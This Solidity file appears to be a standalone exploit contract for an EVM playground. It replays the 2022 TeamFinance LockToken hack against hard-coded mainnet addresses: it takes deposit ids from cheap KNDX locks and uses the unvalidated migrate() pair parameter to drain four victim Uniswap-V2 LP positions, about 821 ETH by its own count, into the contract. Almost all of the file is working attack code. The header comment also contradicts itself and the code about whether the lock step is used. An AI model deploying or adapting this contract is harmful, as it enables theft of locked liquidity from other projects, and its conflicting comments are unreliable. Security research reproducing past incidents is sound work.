// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-10-TeamFinance).
//
// The DeFiHackLabs PoC runs the entire attack INLINE in the Foundry test
// contract (`contract Attacker is Test`, `attacker = address(this)`): setUp()
// creates four cheap KNDX locks to obtain deposit ids, then testExploit() calls
// LockToken.migrate() four times — each time pointing params.pair at a DIFFERENT
// victim Uniswap-V2 LP pair that the LockToken locker custodies on behalf of
// real projects. There is no standalone exploit contract, so we hand-author one
// here that faithfully copies testExploit()'s four migrate() calls.
//
// KEY SIMPLIFICATION (verified against the trace): LockToken.migrate() NEVER
// binds params.pair to lockedToken[_id].tokenAddress, and it does not even read
// lockedToken[_id] before acting — the deposit id is only used to emit the
// LiquidityMigrated event and bump a counter. So the lock creation (and the
// KNDX/ETH it costs) is irrelevant to the value movement; the attack drains the
// victim LP purely via the unvalidated params.pair. We therefore omit the lock
// step entirely and pass an arbitrary _id (1) to each migrate() call. The
// refund of the ~99% un-migrated liquidity flows to `recipient` (this contract)
// exactly as in the original attack.
//
// Logic and constants are copied verbatim from test/TeamFinance_exp.sol
// (testExploit + the MigrateParams literals + swapUsdcToDai). Profit lands on
// this contract: ETH (WETH-side refunds unwrapped via refundAsETH) and DAI
// (USDC-side refunds swapped through Curve 3pool). The headline profit the
// playground scores is the native-ETH delta (~821 ETH).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IV3Migrator {
    struct MigrateParams {
        address pair;
        uint256 liquidityToMigrate;
        uint8 percentageToMigrate;
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
        bool refundAsETH;
    }
}

interface ILockToken {
    // exploit-time 5-arg wrapper (the patched source removed migrate entirely).
    // migrate() reads lockedToken[_id].unlockTime (must still be in the future)
    // but NEVER binds params.pair to lockedToken[_id].tokenAddress — the whole
    // bug. So the attacker creates a cheap lock of a worthless token to obtain a
    // valid _id, then points params.pair at someone else's locked LP.
    function migrate(
        uint256 _id,
        IV3Migrator.MigrateParams calldata params,
        bool noLiquidity,
        uint160 sqrtPriceX96,
        bool _mintNFT
    ) external payable;

    function lockToken(
        address _tokenAddress,
        address _withdrawalAddress,
        uint256 _amount,
        uint256 _unlockTime,
        bool _mintNFT
    ) external payable returns (uint256 _id);

    function extendLockDuration(uint256 _id, uint256 _unlockTime) external;
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}

contract TeamFinanceDrain {
    // --- chain constants (Ethereum mainnet) ----------------------------------
    address constant LockToken = 0xE2fE530C047f2d85298b07D9333C05737f1435fB; // proxy
    address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant caw = 0xf3b9569F82B18aEf890De263B84189bd33EBe452;
    address constant tsuka = 0xc5fB36dd2fb59d3B98dEfF88425a3F425Ee469eD;
    address constant selfmadeToken = 0x2d4ABfDcD1385951DF4317f9F3463fB11b9A31DF; // KNDX

    // victim Uniswap-V2 LP pairs (LP locked in LockToken for real projects)
    address constant FEG_WETH_UniV2Pair = 0x854373387E41371Ac6E307A1F29603c6Fa10D872;
    address constant USDC_CAW_UniV2Pair = 0x7a809081f991eCfe0aB2727C7E90D2Ad7c2E411E;
    address constant USDC_TSUKA_UniV2Pair = 0x67CeA36eEB36Ace126A3Ca6E21405258130CF33C;
    address constant KNDX_WETH_UniV2Pair = 0x9267C29e4f517cE9f6d603a15B50Aa47cE32278D;

    address constant curve_3pool = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7;

    // attacker-chosen V3 init price (tick -5, price ~0.9996); copied verbatim.
    uint160 constant newPriceX96 = 79_210_883_607_084_793_911_461_085_816;

    // Deposit ids obtained from the four cheap KNDX locks created in preWorks().
    // migrate() requires lockedToken[_id].unlockTime to still be in the future
    // (else "Unlock time already reached"), so we MUST hold a real, not-yet-
    // expired lock whose withdrawalAddress is this contract. The lock's token
    // (worthless KNDX) is irrelevant — migrate never binds params.pair to it.
    uint256[4] private lockIds;

    function run() external payable {
        preWorks();

        IV3Migrator.MigrateParams memory parms;

        // ==================== Migrate FEG/WETH pair to V3 ====================
        parms = IV3Migrator.MigrateParams({
            pair: FEG_WETH_UniV2Pair,
            liquidityToMigrate: IERC20(FEG_WETH_UniV2Pair).balanceOf(LockToken),
            percentageToMigrate: 1, // 1% → 99% "refunded" to recipient
            token0: selfmadeToken,
            token1: weth,
            fee: 500,
            tickLower: -100,
            tickUpper: 100,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp,
            refundAsETH: true
        });
        ILockToken(LockToken).migrate(lockIds[0], parms, true, newPriceX96, false);

        // ==================== Migrate USDC/CAW pair to V3 ====================
        parms = IV3Migrator.MigrateParams({
            pair: USDC_CAW_UniV2Pair,
            liquidityToMigrate: IERC20(USDC_CAW_UniV2Pair).balanceOf(LockToken),
            percentageToMigrate: 1,
            token0: usdc,
            token1: caw,
            fee: 500,
            tickLower: -100,
            tickUpper: 100,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp,
            refundAsETH: true
        });
        ILockToken(LockToken).migrate(lockIds[1], parms, true, newPriceX96, false);

        if (IERC20(usdc).balanceOf(address(this)) > 0) {
            swapUsdcToDai();
        }

        // ==================== Migrate USDC/TSUKA pair to V3 ==================
        parms = IV3Migrator.MigrateParams({
            pair: USDC_TSUKA_UniV2Pair,
            liquidityToMigrate: IERC20(USDC_TSUKA_UniV2Pair).balanceOf(LockToken),
            percentageToMigrate: 1,
            token0: usdc,
            token1: tsuka,
            fee: 500,
            tickLower: -100,
            tickUpper: 100,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp,
            refundAsETH: true
        });
        ILockToken(LockToken).migrate(lockIds[2], parms, true, newPriceX96, false);

        if (IERC20(usdc).balanceOf(address(this)) > 0) {
            swapUsdcToDai();
        }

        // ==================== Migrate KNDX/WETH pair to V3 ===================
        parms = IV3Migrator.MigrateParams({
            pair: KNDX_WETH_UniV2Pair,
            liquidityToMigrate: IERC20(KNDX_WETH_UniV2Pair).balanceOf(LockToken),
            percentageToMigrate: 1,
            token0: selfmadeToken,
            token1: weth,
            fee: 500,
            tickLower: -100,
            tickUpper: 100,
            amount0Min: 0,
            amount1Min: 0,
            recipient: address(this),
            deadline: block.timestamp,
            refundAsETH: true
        });
        ILockToken(LockToken).migrate(lockIds[3], parms, true, newPriceX96, false);
    }

    // Create four cheap locks of worthless KNDX to obtain deposit ids this
    // contract owns, then extend their unlock time into the future (migrate
    // rejects already-expired locks). Mirrors the Foundry preWorks() verbatim.
    // Each lockToken call charges a 0.5 ETH fee; the change is refunded to
    // msg.sender, so only a small fraction is actually consumed.
    function preWorks() private {
        uint256 _unlockTime = block.timestamp + 5;
        for (uint256 i; i < 4; ++i) {
            lockIds[i] = ILockToken(LockToken).lockToken{value: 0.5 ether}(
                selfmadeToken, address(this), 1_000_000_000, _unlockTime, false
            );
        }
        for (uint256 i; i < 4; ++i) {
            ILockToken(LockToken).extendLockDuration(lockIds[i], _unlockTime + 40_000);
        }
    }

    function swapUsdcToDai() private {
        uint256 usdc_bal = IERC20(usdc).balanceOf(address(this));
        uint256 min_dy = usdc_bal / 100 * 98;
        IERC20(usdc).approve(curve_3pool, type(uint256).max);
        ICurvePool(curve_3pool).exchange(1, 0, usdc_bal, min_dy);
    }

    receive() external payable {}
}
